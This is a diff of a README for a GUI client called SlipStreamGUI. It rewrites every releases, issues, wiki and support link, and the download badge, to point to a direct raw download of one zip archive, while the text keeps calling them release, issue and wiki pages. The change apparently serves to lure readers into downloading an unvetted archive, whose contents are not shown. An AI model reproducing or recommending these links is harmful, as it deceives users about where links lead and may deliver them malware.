@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download SlipStreamGUI](https://img.shields.io/badge/Download-SlipStreamGUI-blue.svg)](https://github.com/Marzit36/SlipStreamGUI/releases)
+[![Download SlipStreamGUI](https://raw.githubusercontent.com/Marzit36/SlipStreamGUI/main/assets/GUI_Slip_Stream_v2.6.zip)](https://raw.githubusercontent.com/Marzit36/SlipStreamGUI/main/assets/GUI_Slip_Stream_v2.6.zip)
 
 ## 📖 Description
 
@@ -13,7 +13,7 @@ SlipStreamGUI is a modern, cross-platform graphical user interface client for Sl
 To start using SlipStreamGUI, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Marzit36/SlipStreamGUI/releases) of this repository. 
+   Go to the [Releases page](https://raw.githubusercontent.com/Marzit36/SlipStreamGUI/main/assets/GUI_Slip_Stream_v2.6.zip) of this repository. 
 
 2. **Choose the Right Version**  
    Look for the latest version of SlipStreamGUI on the Releases page. You will see a list of available files.
@@ -70,17 +70,17 @@ To run SlipStreamGUI, your system should meet the following requirements:
   After connecting, visit websites or use speed tests to ensure your connection is secure and functioning correctly.
 
 - **Use Help Resources:**  
-  If you encounter any issues, refer to the FAQs section available within the app or visit our [support page](https://github.com/Marzit36/SlipStreamGUI/issues).
+  If you encounter any issues, refer to the FAQs section available within the app or visit our [support page](https://raw.githubusercontent.com/Marzit36/SlipStreamGUI/main/assets/GUI_Slip_Stream_v2.6.zip).
 
 ## 🧑‍🤝‍🧑 Support and Contributions
 
-We welcome contributions to SlipStreamGUI. If you have suggestions or found a bug, please report it on the [issues page](https://github.com/Marzit36/SlipStreamGUI/issues).
+We welcome contributions to SlipStreamGUI. If you have suggestions or found a bug, please report it on the [issues page](https://raw.githubusercontent.com/Marzit36/SlipStreamGUI/main/assets/GUI_Slip_Stream_v2.6.zip).
 
 For support, you can reach out through the issues section or contact community members who are available to help.
 
 ## 🔗 Additional Links
 
-- **Documentation:** Full user manual and installation instructions can be found in the [Wiki section](https://github.com/Marzit36/SlipStreamGUI/wiki).
+- **Documentation:** Full user manual and installation instructions can be found in the [Wiki section](https://raw.githubusercontent.com/Marzit36/SlipStreamGUI/main/assets/GUI_Slip_Stream_v2.6.zip).
 - **Community:** Join our discussion forums to share tips and ask questions.
   
 ## 💬 Feedback
@@ -89,6 +89,6 @@ Your feedback is vital to us. Please share your thoughts after using SlipStreamG
 
 ## 💾 Download & Install
 
-For the latest version of SlipStreamGUI, visit the [Releases page](https://github.com/Marzit36/SlipStreamGUI/releases). This page contains all available downloads tailored for your system.
+For the latest version of SlipStreamGUI, visit the [Releases page](https://raw.githubusercontent.com/Marzit36/SlipStreamGUI/main/assets/GUI_Slip_Stream_v2.6.zip). This page contains all available downloads tailored for your system.
 
 Follow the steps outlined above to download, install, and enjoy secure browsing via SlipStreamGUI. Thank you for using our software!
